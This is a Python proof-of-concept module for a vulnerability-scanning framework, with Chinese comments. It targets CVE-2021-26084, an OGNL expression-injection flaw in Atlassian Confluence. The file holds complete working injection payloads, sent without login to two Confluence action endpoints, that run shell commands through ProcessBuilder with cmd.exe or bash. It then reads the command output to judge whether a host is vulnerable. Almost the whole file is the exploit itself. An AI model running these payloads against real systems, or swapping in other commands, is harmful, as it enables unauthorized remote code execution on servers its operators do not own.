import pocs
from lib import config
import re
import urllib3
from bs4 import BeautifulSoup
import requests
from colorama import init, Fore
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 
session = requests.Session()

class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        super().__init__()
        self.poc_name='Atlassian Confluence OGNL表达式注入代码执行漏洞'
        self.vul_name='Atlassian Confluence OGNL表达式注入代码执行漏洞'
        self.vul_num='CVE-2021-26084'
        self.app_name='Atlassian Confluence '
        self.app_version='<6.13.23 <7.4.11 <7.11.6 <7.12.5 <7.13.0'
        self.author='haochen'
        self.msg='可以通过表达式注入执行命令，不登陆的情况下有2个接口存在该漏洞，登陆后有一个接口存在该漏洞'
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        att_msg={}
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        head = config.Pack
        tmp = ''
        head = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36", 
                        "Connection": "close", 
                        "Content-Type": "application/x-www-form-urlencoded", 
                        "Accept-Encoding": "gzip, deflate"}  
        payload1 = "/pages/doenterpagevariables.action"
        payload2 = "/pages/createpage-entervariables.action"
        exp1 = url + payload1
        exp2 = url + payload2
        data1 = {"queryString": "\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022ipconfig\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
        data2 = {"queryString": "\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022ifconfig\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
        try:
            re1 = session.post(exp1, headers=head, data=data1, verify=False,timeout=5)  
            soup1 = BeautifulSoup(re1.text, 'html.parser')
            tmp = soup1.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
        except:
            pass
        if 'IP' in tmp:
                att_msg['status'] = 'success'
                att_msg['msg'] = '存在漏洞'
        else:
            try:
                re2 = session.post(exp2, headers=head, data=data2, verify=False,timeout=5)  
                soup2 = BeautifulSoup(re2.text, 'html.parser')
                tmp = soup2.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
            except:
                pass
            if 'IP' in tmp:
                att_msg['status'] = 'success'
                att_msg['msg'] = '存在漏洞'
            else:
                try:
                    re3 = session.post(exp1, headers=head, data=data1, verify=False,timeout=5)
                    soup3 = BeautifulSoup(re3.text, 'html.parser')
                    tmp = soup3.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
                except:
                    pass
                if 'IP' in tmp:
                    att_msg['status'] = 'success'
                    att_msg['msg'] = '存在漏洞'
                else:
                    try:
                        re4 = session.post(exp2, headers=head, data=data2, verify=False,timeout=5)
                        soup4 = BeautifulSoup(re4.text, 'html.parser') 
                        tmp = soup4.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
                    except:
                        att_msg['status']='error'
                        att_msg['msg']='无法正确访问网站'
                    if 'IP' in tmp:
                        att_msg['status'] = 'success'
                        att_msg['msg'] = '存在漏洞'
                    else:
                        att_msg['status']='failed'
                        att_msg['msg']='不存在该漏洞！' 
        return att_msg

    
        
